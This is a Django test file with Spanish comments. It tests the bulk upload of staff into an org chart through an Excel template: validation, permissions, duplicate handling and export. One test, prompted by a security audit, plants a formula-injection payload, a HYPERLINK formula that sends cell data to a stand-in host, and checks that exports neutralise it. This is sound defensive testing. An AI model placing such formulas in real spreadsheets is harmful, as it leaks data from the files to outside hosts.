"""Carga masiva de personas desde la plantilla del organigrama (20/10/2026).

Lo que se protege:

- La plantilla trae una hoja por unidad, ordenada por cadena de mando: el
  gerente del área primero, con su nivel, a quién reporta y la cadena completa,
  y una fila por plaza (ya llenada con quien ocupa hoy cada cargo).
- Subirla primero valida sin guardar nada; confirmar aplica todo o nada.
- Con correo de una cuenta de la empresa, se asigna el cargo (y su rol de
  nivel); sin cuenta, el nombre queda como ocupante y se ve en el organigrama.
  Volver a subirla no duplica.
- Quien figuraba sin cuenta recibe su cargo al entrar a la empresa.
- Se rechaza un ID ajeno, nombres sin apellidos, correos inválidos, no
  institucionales o repetidos. Solo con `institucional.asignar`.
"""

import io

from django.contrib.auth.models import Permission
from django.contrib.contenttypes.models import ContentType
from django.core.files.uploadedfile import SimpleUploadedFile
from openpyxl import load_workbook
from rest_framework.test import APIClient

from apps.empresas.contexto import empresa_actual, usando_empresa
from apps.empresas.models import MembresiaEmpresa
from apps.organizacion.models import (
    Cargo,
    DatosDeContacto,
    NivelJerarquico,
    OcupanteCargo,
    UnidadOrganizacional,
)
from apps.permissions.models import ModulePermission
from apps.users.models import User

BASE = "/api/v1/organizacion/"
PLANTILLA = f"{BASE}carga-personas/plantilla/"
CARGA = f"{BASE}carga-personas/"


def _cuenta(nombre, *permisos, miembro=True):
    usuario = User.objects.create_user(
        username=nombre,
        email=f"{nombre}@grupolaar.com",
        password="Sup3r-Secr3t!",
        first_name=nombre.capitalize(),
        last_name="Prueba",
    )
    usuario.user_permissions.set(
        Permission.objects.filter(
            content_type=ContentType.objects.get_for_model(ModulePermission), codename__in=permisos
        )
    )
    if miembro:
        MembresiaEmpresa.objects.create(usuario=usuario, empresa=empresa_actual())
    cliente = APIClient()
    cliente.force_authenticate(user=usuario)
    return usuario, cliente


def _estructura():
    """Gerencia General (Gerente General) > Comercial (Gerente Comercial >
    Analista comercial, 2 plazas)."""
    with usando_empresa(empresa_actual()):
        alta = NivelJerarquico.objects.create(nombre="Gerencia", orden=1)
        area = NivelJerarquico.objects.create(nombre="Área", orden=2)
        general = UnidadOrganizacional.objects.create(nombre="Gerencia General", nivel=alta)
        comercial = UnidadOrganizacional.objects.create(
            nombre="Comercial", nivel=area, padre=general
        )
        gg = Cargo.objects.create(nombre="Gerente General", unidad=general)
        gerente = Cargo.objects.create(nombre="Gerente Comercial", unidad=comercial, jefe=gg)
        analista = Cargo.objects.create(
            nombre="Analista comercial", unidad=comercial, jefe=gerente, plazas=2
        )
    return {"gg": gg, "gerente": gerente, "analista": analista}


def _plantilla(cliente):
    respuesta = cliente.get(PLANTILLA)
    assert respuesta.status_code == 200
    assert respuesta["Content-Disposition"].endswith('plantilla-carga-organigrama.xlsx"')
    return load_workbook(io.BytesIO(respuesta.content))


def _completo(cliente):
    respuesta = cliente.get(f"{BASE}organigrama/exportar/")
    assert respuesta.status_code == 200
    assert "organigrama-completo-" in respuesta["Content-Disposition"]
    return load_workbook(io.BytesIO(respuesta.content))


def _filas(hoja):
    """Las filas de la tabla (desde el encabezado «ID»)."""
    filas = list(hoja.iter_rows(values_only=True))
    inicio = next(i for i, f in enumerate(filas) if f[0] == "ID")
    return inicio, filas[inicio:]


def _subir(cliente, libro, confirmar=False):
    salida = io.BytesIO()
    libro.save(salida)
    archivo = SimpleUploadedFile("organigrama-personas.xlsx", salida.getvalue())
    return cliente.post(
        CARGA,
        {"archivo": archivo, "confirmar": "true" if confirmar else "false"},
        format="multipart",
    )


def _llenar(hoja, cargo, plaza, nombres, apellidos, correo=""):
    inicio, filas = _filas(hoja)
    vistas = 0
    for i, fila in enumerate(filas[1:], start=inicio + 2):
        if fila[0] == cargo.pk:
            vistas += 1
            if vistas == plaza:
                hoja.cell(row=i, column=8, value=nombres)
                hoja.cell(row=i, column=9, value=apellidos)
                hoja.cell(row=i, column=10, value=correo)
                return
    raise AssertionError("no está esa plaza")


def test_la_plantilla_trae_una_hoja_por_unidad_con_la_cadena_de_mando(db):
    c = _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    libro = _plantilla(admin)
    assert libro.sheetnames == ["Instrucciones", "Gerencia General", "Comercial"]
    hoja = libro["Comercial"]
    assert hoja["A1"].value == "Comercial"
    assert hoja["A2"].value == "Nivel jerárquico: Área"
    assert hoja["A3"].value == "Gerente del área: Gerente Comercial · reporta a Gerente General"
    _, filas = _filas(hoja)
    assert filas[0] == (
        "ID",
        "Nivel jerárquico",
        "Nivel en el área",
        "Cargo",
        "Reporta a",
        "Cadena de mando",
        "Plaza",
        "Nombres",
        "Apellidos",
        "Correo institucional",
    )
    # El gerente del área primero y debajo su cadena, una fila por plaza.
    assert [f[:7] for f in filas[1:]] == [
        (
            c["gerente"].pk,
            "Área",
            1,
            "Gerente Comercial",
            "Gerente General",
            "Gerente General › Gerente Comercial",
            "1 de 1",
        ),
        (
            c["analista"].pk,
            "Área",
            2,
            "Analista comercial",
            "Gerente Comercial",
            "Gerente General › Gerente Comercial › Analista comercial",
            "1 de 2",
        ),
        (
            c["analista"].pk,
            "Área",
            2,
            "Analista comercial",
            "Gerente Comercial",
            "Gerente General › Gerente Comercial › Analista comercial",
            "2 de 2",
        ),
    ]


def test_validar_no_guarda_y_confirmar_asigna_y_registra(db):
    c = _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    rosa, _ = _cuenta("rosa")
    libro = _plantilla(admin)
    hoja = libro["Comercial"]
    _llenar(hoja, c["gerente"], 1, "Rosa", "Vera", "ROSA@grupolaar.com")
    _llenar(hoja, c["analista"], 1, "Pedro", "Mora", "pedro.mora@grupolaar.com")
    _llenar(hoja, c["analista"], 2, "Lucía", "Paz")

    validado = _subir(admin, libro)
    assert validado.status_code == 200, validado.data
    assert validado.json() | {"avisos": []} == {
        "valido": True,
        "errores": [],
        "total_errores": 0,
        "avisos": [],
        "cargos": 2,  # los de la hoja «Comercial», la única con personas
        "personas": 3,
        "con_cuenta": 1,
        "sin_cuenta": 2,
        "aplicado": False,
    }
    with usando_empresa(empresa_actual()):
        assert not OcupanteCargo.objects.exists()
        assert not DatosDeContacto.objects.filter(usuario=rosa).exists()

    assert _subir(admin, libro, confirmar=True).json()["aplicado"] is True
    with usando_empresa(empresa_actual()):
        assert DatosDeContacto.objects.get(usuario=rosa).cargo == c["gerente"]
        assert sorted(str(o) for o in OcupanteCargo.objects.all()) == [
            "Lucía Paz",
            "Pedro Mora",
        ]
    # En el organigrama se ven los dos, los sin cuenta marcados.
    organigrama = admin.get(f"{BASE}organigrama/").json()
    analista = next(x for x in organigrama["cargos"] if x["id"] == c["analista"].pk)
    assert {p["nombre"] for p in analista["ocupantes"]} == {"Pedro Mora", "Lucía Paz"}
    assert all(p["sin_cuenta"] for p in analista["ocupantes"])
    assert analista["vacantes"] == 0

    # El organigrama completo trae a todos, con su situación y el resumen.
    completo = _completo(admin)
    assert completo.sheetnames[:2] == ["Resumen", "Instrucciones"]
    _, filas = _filas(completo["Comercial"])
    assert filas[0][10] == "Situación"
    assert [(f[7], f[8], f[10]) for f in filas[1:]] == [
        ("Rosa", "Prueba", "Con cuenta"),
        ("Pedro", "Mora", "Sin cuenta"),  # sin cuenta, por apellido
        ("Lucía", "Paz", "Sin cuenta"),
    ]
    resumen = list(completo["Resumen"].iter_rows(min_row=4, values_only=True))
    assert resumen[1] == (
        "Comercial",
        "Área",
        "Gerencia General",
        "—",
        "Gerente Comercial",
        2,
        3,
        3,
        2,
        0,
    )

    # Subir el completo no duplica; la plantilla vacía no borra nada.
    assert _subir(admin, completo, confirmar=True).status_code == 200
    with usando_empresa(empresa_actual()):
        assert OcupanteCargo.objects.count() == 2
    vacia = _subir(admin, _plantilla(admin), confirmar=True)
    assert vacia.status_code == 400
    assert "no trae ninguna persona" in vacia.json()["errores"][0]

    # Quitar a alguien de una hoja con personas lo quita.
    completo = _completo(admin)
    _llenar(completo["Comercial"], c["analista"], 2, "", "", "")
    assert _subir(admin, completo, confirmar=True).status_code == 200
    with usando_empresa(empresa_actual()):
        assert [str(o) for o in OcupanteCargo.objects.all()] == ["Pedro Mora"]


def test_quien_figuraba_sin_cuenta_recibe_su_cargo_al_entrar(db):
    c = _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    libro = _plantilla(admin)
    _llenar(libro["Comercial"], c["analista"], 1, "Pedro", "Mora", "pedro@grupolaar.com")
    assert _subir(admin, libro, confirmar=True).status_code == 200
    pedro, _ = _cuenta("pedro")
    with usando_empresa(empresa_actual()):
        assert DatosDeContacto.objects.get(usuario=pedro).cargo == c["analista"]
        assert not OcupanteCargo.objects.exists()


def test_un_archivo_con_errores_no_aplica_nada(db):
    c = _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    libro = _plantilla(admin)
    hoja = libro["Comercial"]
    _llenar(hoja, c["gerente"], 1, "Rosa", "", "")
    _llenar(hoja, c["analista"], 1, "Pedro", "Mora", "pedro@gmail.com")
    _llenar(hoja, c["analista"], 2, "Lucía", "Paz", "no-es-correo")
    fila = hoja.max_row + 1
    for col, valor in ((1, 99999), (8, "Ana"), (9, "Ruiz")):
        hoja.cell(row=fila, column=col, value=valor)
    respuesta = _subir(admin, libro, confirmar=True)
    assert respuesta.status_code == 400
    errores = " | ".join(respuesta.json()["errores"])
    assert "escriba nombres y apellidos" in errores
    assert "no es un correo institucional" in errores
    assert "no es un correo válido" in errores
    assert "el ID «99999» no es un cargo" in errores
    with usando_empresa(empresa_actual()):
        assert not OcupanteCargo.objects.exists()


def test_correos_repetidos_y_mas_personas_que_plazas(db):
    c = _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    libro = _plantilla(admin)
    hoja = libro["Comercial"]
    _llenar(hoja, c["analista"], 1, "Pedro", "Mora", "pedro@grupolaar.com")
    _llenar(hoja, c["analista"], 2, "Pedro", "Mora", "pedro@grupolaar.com")
    assert "ya está en" in " ".join(_subir(admin, libro).json()["errores"])

    _llenar(hoja, c["analista"], 2, "Lucía", "Paz")
    fila = hoja.max_row + 1
    for col, valor in ((1, c["analista"].pk), (8, "Ana"), (9, "Ruiz")):
        hoja.cell(row=fila, column=col, value=valor)
    respuesta = _subir(admin, libro)
    assert respuesta.status_code == 200
    assert "tiene 2 plazas y se cargan 3 personas" in respuesta.json()["avisos"][0]


def test_no_es_un_xlsx_y_solo_quien_asigna_cargos(db):
    _estructura()
    _, admin = _cuenta("ines", "institucional.asignar")
    _, otro = _cuenta("rosa", "institucional.ver")
    _, arma = _cuenta("ema", "institucional.editar")
    assert otro.get(PLANTILLA).status_code == 403
    assert otro.get(f"{BASE}organigrama/exportar/").status_code == 403
    # Quien arma la estructura descarga los dos archivos, pero no carga.
    assert arma.get(PLANTILLA).status_code == 200
    assert arma.get(f"{BASE}organigrama/exportar/").status_code == 200
    assert arma.post(CARGA, {}, format="multipart").status_code == 403
    assert otro.post(CARGA, {}, format="multipart").status_code == 403
    falso = SimpleUploadedFile("organigrama.xlsx", b"no soy un excel")
    respuesta = admin.post(CARGA, {"archivo": falso}, format="multipart")
    assert respuesta.status_code == 400
    assert "no es un .xlsx válido" in respuesta.json()["errores"][0]


def test_un_nombre_que_empieza_por_igual_no_baja_como_formula(db):
    """Auditoría de seguridad, 29/10/2026: un nombre de la base que empiece por
    «=» se ejecutaría como fórmula al abrir el organigrama exportado."""
    c = _estructura()
    with usando_empresa(empresa_actual()):
        c["analista"].nombre = '=HYPERLINK("http://x.test/?"&A1,"Ver")'
        c["analista"].save()
        OcupanteCargo.objects.create(cargo=c["analista"], nombres="=1+1", apellidos="-Mora")
    _, admin = _cuenta("ines", "institucional.asignar")

    for libro in (_plantilla(admin), _completo(admin)):
        _, filas = _filas(libro["Comercial"])
        cargos = [f[3] for f in filas[1:]]
        assert '\'=HYPERLINK("http://x.test/?"&A1,"Ver")' in cargos
        assert all(not str(v).startswith("=") for f in filas for v in f if v is not None)

    # El archivo bajado lleno se vuelve a subir tal cual: la comilla no es parte del dato.
    assert _subir(admin, _completo(admin), confirmar=True).status_code == 200
    with usando_empresa(empresa_actual()):
        assert [str(o) for o in OcupanteCargo.objects.all()] == ["=1+1 -Mora"]
